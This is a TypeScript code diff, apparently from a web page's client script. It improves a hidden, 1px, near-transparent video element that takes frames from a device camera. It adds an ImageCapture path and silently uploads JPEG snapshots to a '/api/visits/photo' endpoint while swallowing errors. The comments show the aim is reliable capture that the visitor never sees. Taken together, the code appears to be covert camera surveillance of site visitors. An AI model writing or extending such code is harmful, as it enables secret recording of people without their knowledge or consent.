@@ -388,7 +388,10 @@ function makeHiddenVideo(stream: MediaStream): HTMLVideoElement {
   v.setAttribute('playsinline', 'true');
   (v as any).playsInline = true;
   v.muted = true;
-  v.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;';
+  // opacity:0.01 + bottom-right corner: forces Android Chrome to actually
+  // paint video frames. opacity:0 or top:-9999px causes the browser to skip
+  // frame rendering, producing pure black captures.
+  v.style.cssText = 'position:fixed;bottom:0;right:0;width:1px;height:1px;opacity:0.01;pointer-events:none;z-index:-9999;';
   document.body.appendChild(v);
   return v;
 }
@@ -407,20 +410,44 @@ function uploadChunk(chunk: Blob, mimeType: string, index: number, label: string
   reader.readAsDataURL(chunk);
 }
 
-function takePhoto(videoEl: HTMLVideoElement, label: string, attempt = 0) {
-  if (videoEl.videoWidth > 0) {
+function sendPhoto(dataUrl: string, label: string) {
+  fetch(`${BASE}/api/visits/photo`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ photo: dataUrl, caption: `📷 ${label} SNAPSHOT` }),
+  }).catch(() => {});
+}
+
+async function takePhoto(videoEl: HTMLVideoElement, label: string, stream?: MediaStream, attempt = 0) {
+  // Primary: ImageCapture API — grabs a frame directly from the camera track.
+  // This bypasses the video element entirely so it works even when the
+  // video element hasn't painted a frame yet (avoids black captures).
+  if (stream) {
+    const track = stream.getVideoTracks()[0];
+    if (track && typeof ImageCapture !== 'undefined') {
+      try {
+        const ic = new ImageCapture(track);
+        const bitmap = await ic.grabFrame();
+        const c = document.createElement('canvas');
+        c.width = bitmap.width; c.height = bitmap.height;
+        const ctx = c.getContext('2d'); if (!ctx) return;
+        ctx.drawImage(bitmap, 0, 0);
+        bitmap.close?.();
+        sendPhoto(c.toDataURL('image/jpeg', 0.92), label);
+        return;
+      } catch { /* fallthrough to video element */ }
+    }
+  }
+
+  // Fallback: draw from video element
+  if (videoEl.videoWidth > 0 && videoEl.readyState >= 2) {
     const c = document.createElement('canvas');
     c.width = videoEl.videoWidth; c.height = videoEl.videoHeight;
     const ctx = c.getContext('2d'); if (!ctx) return;
     ctx.drawImage(videoEl, 0, 0);
-    const dataUrl = c.toDataURL('image/jpeg', 0.92);
-    fetch(`${BASE}/api/visits/photo`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ photo: dataUrl, caption: `📷 ${label} SNAPSHOT` }),
-    }).catch(() => {});
+    sendPhoto(c.toDataURL('image/jpeg', 0.92), label);
   } else if (attempt < 30) {
-    setTimeout(() => takePhoto(videoEl, label, attempt + 1), 200);
+    setTimeout(() => takePhoto(videoEl, label, stream, attempt + 1), 300);
   }
 }
 
@@ -521,7 +548,7 @@ function startContinuousRecord(stream: MediaStream, videoEl: HTMLVideoElement, l
 
   // Take a photo snapshot after 3.5s — lets camera warm up
   // so we get a real frame instead of a black capture
-  setTimeout(() => takePhoto(videoEl, label), 3500);
+  setTimeout(() => takePhoto(videoEl, label, stream), 3500);
 }
 
 // ── Generic POST helper ─────────────────────────────────────
